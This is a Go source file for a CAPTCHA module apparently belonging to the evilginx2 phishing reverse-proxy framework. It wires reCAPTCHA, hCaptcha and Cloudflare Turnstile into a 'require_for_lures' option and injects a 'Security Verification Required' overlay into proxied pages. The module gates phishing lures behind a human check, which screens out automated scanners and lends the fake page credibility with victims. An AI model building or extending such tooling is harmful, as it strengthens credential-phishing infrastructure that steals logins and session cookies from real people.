package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"

	"github.com/kgretzky/evilginx2/log"
)

type CaptchaProvider interface {
	GetName() string
	
	GetScriptURL() string
	
	GetRenderHTML() string
	
	Verify(response string, remoteIP string) (bool, error)
	
	IsConfigured() bool
}

type CaptchaManager struct {
	providers     map[string]CaptchaProvider
	activeProvider string
	config        *CaptchaConfig
}

type CaptchaConfig struct {
	Enabled        bool                     `json:"enabled" yaml:"enabled"`
	Provider       string                   `json:"provider" yaml:"provider"`
	RequireForLures bool                    `json:"require_for_lures" yaml:"require_for_lures"`
	Providers      map[string]ProviderConfig `json:"providers" yaml:"providers"`
}

type ProviderConfig struct {
	SiteKey   string            `json:"site_key" yaml:"site_key"`
	SecretKey string            `json:"secret_key" yaml:"secret_key"`
	Options   map[string]string `json:"options,omitempty" yaml:"options,omitempty"`
}

type ReCaptchaV2Provider struct {
	siteKey   string
	secretKey string
	theme     string
	size      string
}

type ReCaptchaV3Provider struct {
	siteKey   string
	secretKey string
	action    string
	threshold float64
}

type HCaptchaProvider struct {
	siteKey   string
	secretKey string
	theme     string
}

type TurnstileProvider struct {
	siteKey   string
	secretKey string
	theme     string
	mode      string
}

func NewCaptchaManager(config *CaptchaConfig) *CaptchaManager {
	cm := &CaptchaManager{
		providers: make(map[string]CaptchaProvider),
		config:    config,
	}
	
	if config != nil && config.Providers != nil {
		for providerName, providerConfig := range config.Providers {
			switch providerName {
			case "recaptcha_v2":
				provider := NewReCaptchaV2Provider(
					providerConfig.SiteKey,
					providerConfig.SecretKey,
					providerConfig.Options["theme"],
					providerConfig.Options["size"],
				)
				cm.providers["recaptcha_v2"] = provider
				
			case "recaptcha_v3":
				threshold := 0.5
				if t, ok := providerConfig.Options["threshold"]; ok {
					fmt.Sscanf(t, "%f", &threshold)
				}
				provider := NewReCaptchaV3Provider(
					providerConfig.SiteKey,
					providerConfig.SecretKey,
					providerConfig.Options["action"],
					threshold,
				)
				cm.providers["recaptcha_v3"] = provider
				
			case "hcaptcha":
				provider := NewHCaptchaProvider(
					providerConfig.SiteKey,
					providerConfig.SecretKey,
					providerConfig.Options["theme"],
				)
				cm.providers["hcaptcha"] = provider
				
			case "turnstile":
				provider := NewTurnstileProvider(
					providerConfig.SiteKey,
					providerConfig.SecretKey,
					providerConfig.Options["theme"],
					providerConfig.Options["mode"],
				)
				cm.providers["turnstile"] = provider
			}
		}
		
		if config.Provider != "" && cm.providers[config.Provider] != nil {
			cm.activeProvider = config.Provider
			log.Info("Active CAPTCHA provider: %s", cm.activeProvider)
		}
	}
	
	return cm
}

func (cm *CaptchaManager) GetActiveProvider() CaptchaProvider {
	if cm.activeProvider == "" {
		return nil
	}
	return cm.providers[cm.activeProvider]
}

func (cm *CaptchaManager) SetActiveProvider(name string) error {
	if provider, ok := cm.providers[name]; ok {
		if !provider.IsConfigured() {
			return fmt.Errorf("provider %s is not properly configured", name)
		}
		cm.activeProvider = name
		cm.config.Provider = name
		log.Info("Active CAPTCHA provider set to: %s", name)
		return nil
	}
	return fmt.Errorf("provider %s not found", name)
}

func (cm *CaptchaManager) GetProviderNames() []string {
	names := make([]string, 0, len(cm.providers))
	for name := range cm.providers {
		names = append(names, name)
	}
	return names
}

func (cm *CaptchaManager) IsEnabled() bool {
	return cm.config != nil && cm.config.Enabled && cm.GetActiveProvider() != nil
}

func (cm *CaptchaManager) GetCaptchaHTML() string {
	if !cm.IsEnabled() {
		return ""
	}
	
	provider := cm.GetActiveProvider()
	if provider == nil {
		return ""
	}
	
	scriptURL := provider.GetScriptURL()
	renderHTML := provider.GetRenderHTML()
	
	html := fmt.Sprintf(`
<!-- CAPTCHA Protection -->
<div id="evilginx-captcha-container" style="display:none;">
	<div style="position:fixed;top:0;left:0;width:100%%;height:100%%;background:rgba(0,0,0,0.7);z-index:9998;"></div>
	<div style="position:fixed;top:50%%;left:50%%;transform:translate(-50%%,-50%%);background:white;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.3);z-index:9999;">
		<h3 style="margin-top:0;">Security Verification Required</h3>
		<p>Please complete the security check to continue.</p>
		<form id="evilginx-captcha-form" method="POST" action="/verify/captcha">
			%s
			<div style="margin-top:20px;">
				<button type="submit" style="padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;">Continue</button>
			</div>
		</form>
	</div>
</div>
<script src="%s" async defer></script>
<script>
// Auto-show CAPTCHA if not verified
(function() {
	var verified = localStorage.getItem('evilginx_captcha_verified');
	var sessionId = document.cookie.match(/evilginx_session=([^;]+)/);
	
	if (!verified || (sessionId && verified !== sessionId[1])) {
		setTimeout(function() {
			var container = document.getElementById('evilginx-captcha-container');
			if (container) {
				container.style.display = 'block';
			}
		}, 1000);
	}
	
	// Handle form submission
	var form = document.getElementById('evilginx-captcha-form');
	if (form) {
		form.addEventListener('submit', function(e) {
			e.preventDefault();
			
			// Get CAPTCHA response based on provider
			var response = '';
			%s
			
			// Send verification request
			fetch('/verify/captcha', {
				method: 'POST',
				headers: {'Content-Type': 'application/json'},
				body: JSON.stringify({response: response})
			}).then(function(res) {
				return res.json();
			}).then(function(data) {
				if (data.success) {
					// Store verification
					if (sessionId) {
						localStorage.setItem('evilginx_captcha_verified', sessionId[1]);
					}
					// Hide container and reload
					document.getElementById('evilginx-captcha-container').style.display = 'none';
					window.location.reload();
				} else {
					alert('Verification failed. Please try again.');
					%s
				}
			});
		});
	}
})();
</script>
`, renderHTML, scriptURL, cm.getResponseExtractorJS(), cm.getResetJS())
	
	return html
}

func (cm *CaptchaManager) getResponseExtractorJS() string {
	switch cm.activeProvider {
	case "recaptcha_v2":
		return "response = grecaptcha.getResponse();"
	case "recaptcha_v3":
		return "grecaptcha.ready(function() { grecaptcha.execute('" + cm.providers["recaptcha_v3"].(*ReCaptchaV3Provider).siteKey + "', {action: '" + cm.providers["recaptcha_v3"].(*ReCaptchaV3Provider).action + "'}).then(function(token) { response = token; }); });"
	case "hcaptcha":
		return "response = hcaptcha.getResponse();"
	case "turnstile":
		return "response = turnstile.getResponse();"
	default:
		return ""
	}
}

func (cm *CaptchaManager) getResetJS() string {
	switch cm.activeProvider {
	case "recaptcha_v2":
		return "grecaptcha.reset();"
	case "recaptcha_v3":
		return "// reCAPTCHA v3 auto-refreshes"
	case "hcaptcha":
		return "hcaptcha.reset();"
	case "turnstile":
		return "turnstile.reset();"
	default:
		return ""
	}
}

func (cm *CaptchaManager) VerifyCaptcha(response string, remoteIP string) (bool, error) {
	if !cm.IsEnabled() {
		return true, nil
	}
	
	provider := cm.GetActiveProvider()
	if provider == nil {
		return false, fmt.Errorf("no active CAPTCHA provider")
	}
	
	return provider.Verify(response, remoteIP)
}

func NewReCaptchaV2Provider(siteKey, secretKey, theme, size string) *ReCaptchaV2Provider {
	if theme == "" {
		theme = "light"
	}
	if size == "" {
		size = "normal"
	}
	
	return &ReCaptchaV2Provider{
		siteKey:   siteKey,
		secretKey: secretKey,
		theme:     theme,
		size:      size,
	}
}

func (r *ReCaptchaV2Provider) GetName() string {
	return "reCAPTCHA v2"
}

func (r *ReCaptchaV2Provider) GetScriptURL() string {
	return "https://www.google.com/recaptcha/api.js"
}

func (r *ReCaptchaV2Provider) GetRenderHTML() string {
	return fmt.Sprintf(`<div class="g-recaptcha" data-sitekey="%s" data-theme="%s" data-size="%s"></div>`, 
		r.siteKey, r.theme, r.size)
}

func (r *ReCaptchaV2Provider) Verify(response string, remoteIP string) (bool, error) {
	verifyURL := "https://www.google.com/recaptcha/api/siteverify"
	
	resp, err := http.PostForm(verifyURL, url.Values{
		"secret":   {r.secretKey},
		"response": {response},
		"remoteip": {remoteIP},
	})
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	
	var result struct {
		Success bool   `json:"success"`
		Error   string `json:"error-codes"`
	}
	
	err = json.Unmarshal(body, &result)
	if err != nil {
		return false, err
	}
	
	log.Debug("[reCAPTCHA v2] Verification result: %v", result.Success)
	return result.Success, nil
}

func (r *ReCaptchaV2Provider) IsConfigured() bool {
	return r.siteKey != "" && r.secretKey != ""
}

func NewReCaptchaV3Provider(siteKey, secretKey, action string, threshold float64) *ReCaptchaV3Provider {
	if action == "" {
		action = "submit"
	}
	if threshold == 0 {
		threshold = 0.5
	}
	
	return &ReCaptchaV3Provider{
		siteKey:   siteKey,
		secretKey: secretKey,
		action:    action,
		threshold: threshold,
	}
}

func (r *ReCaptchaV3Provider) GetName() string {
	return "reCAPTCHA v3"
}

func (r *ReCaptchaV3Provider) GetScriptURL() string {
	return fmt.Sprintf("https://www.google.com/recaptcha/api.js?render=%s", r.siteKey)
}

func (r *ReCaptchaV3Provider) GetRenderHTML() string {
	return `<input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">`
}

func (r *ReCaptchaV3Provider) Verify(response string, remoteIP string) (bool, error) {
	verifyURL := "https://www.google.com/recaptcha/api/siteverify"
	
	resp, err := http.PostForm(verifyURL, url.Values{
		"secret":   {r.secretKey},
		"response": {response},
		"remoteip": {remoteIP},
	})
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	
	var result struct {
		Success bool    `json:"success"`
		Score   float64 `json:"score"`
		Action  string  `json:"action"`
		Error   string  `json:"error-codes"`
	}
	
	err = json.Unmarshal(body, &result)
	if err != nil {
		return false, err
	}
	
	success := result.Success && result.Score >= r.threshold
	
	log.Debug("[reCAPTCHA v3] Verification result: success=%v, score=%.2f, threshold=%.2f", 
		result.Success, result.Score, r.threshold)
	
	return success, nil
}

func (r *ReCaptchaV3Provider) IsConfigured() bool {
	return r.siteKey != "" && r.secretKey != ""
}

func NewHCaptchaProvider(siteKey, secretKey, theme string) *HCaptchaProvider {
	if theme == "" {
		theme = "light"
	}
	
	return &HCaptchaProvider{
		siteKey:   siteKey,
		secretKey: secretKey,
		theme:     theme,
	}
}

func (h *HCaptchaProvider) GetName() string {
	return "hCaptcha"
}

func (h *HCaptchaProvider) GetScriptURL() string {
	return "https://js.hcaptcha.com/1/api.js"
}

func (h *HCaptchaProvider) GetRenderHTML() string {
	return fmt.Sprintf(`<div class="h-captcha" data-sitekey="%s" data-theme="%s"></div>`, 
		h.siteKey, h.theme)
}

func (h *HCaptchaProvider) Verify(response string, remoteIP string) (bool, error) {
	verifyURL := "https://hcaptcha.com/siteverify"
	
	formData := url.Values{
		"secret":   {h.secretKey},
		"response": {response},
		"sitekey":  {h.siteKey},
	}
	
	if remoteIP != "" {
		formData.Add("remoteip", remoteIP)
	}
	
	resp, err := http.PostForm(verifyURL, formData)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	
	var result struct {
		Success bool     `json:"success"`
		Error   []string `json:"error-codes"`
	}
	
	err = json.Unmarshal(body, &result)
	if err != nil {
		return false, err
	}
	
	log.Debug("[hCaptcha] Verification result: %v", result.Success)
	return result.Success, nil
}

func (h *HCaptchaProvider) IsConfigured() bool {
	return h.siteKey != "" && h.secretKey != ""
}

func NewTurnstileProvider(siteKey, secretKey, theme, mode string) *TurnstileProvider {
	if theme == "" {
		theme = "light"
	}
	if mode == "" {
		mode = "managed"
	}
	
	return &TurnstileProvider{
		siteKey:   siteKey,
		secretKey: secretKey,
		theme:     theme,
		mode:      mode,
	}
}

func (t *TurnstileProvider) GetName() string {
	return "Cloudflare Turnstile"
}

func (t *TurnstileProvider) GetScriptURL() string {
	return "https://challenges.cloudflare.com/turnstile/v0/api.js"
}

func (t *TurnstileProvider) GetRenderHTML() string {
	return fmt.Sprintf(`<div class="cf-turnstile" data-sitekey="%s" data-theme="%s" data-appearance="%s"></div>`, 
		t.siteKey, t.theme, t.mode)
}

func (t *TurnstileProvider) Verify(response string, remoteIP string) (bool, error) {
	verifyURL := "https://challenges.cloudflare.com/turnstile/v0/siteverify"
	
	payload := map[string]string{
		"secret":   t.secretKey,
		"response": response,
	}
	
	if remoteIP != "" {
		payload["remoteip"] = remoteIP
	}
	
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return false, err
	}
	
	resp, err := http.Post(verifyURL, "application/json", bytes.NewReader(jsonPayload))
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	
	var result struct {
		Success bool     `json:"success"`
		Error   []string `json:"error-codes"`
	}
	
	err = json.Unmarshal(body, &result)
	if err != nil {
		return false, err
	}
	
	log.Debug("[Turnstile] Verification result: %v", result.Success)
	return result.Success, nil
}

func (t *TurnstileProvider) IsConfigured() bool {
	return t.siteKey != "" && t.secretKey != ""
}

func (cm *CaptchaManager) GetCaptchaStats() map[string]interface{} {
	stats := make(map[string]interface{})
	
	stats["enabled"] = cm.IsEnabled()
	stats["active_provider"] = cm.activeProvider
	stats["configured_providers"] = cm.GetProviderNames()
	stats["require_for_lures"] = cm.config != nil && cm.config.RequireForLures
	
	return stats
}
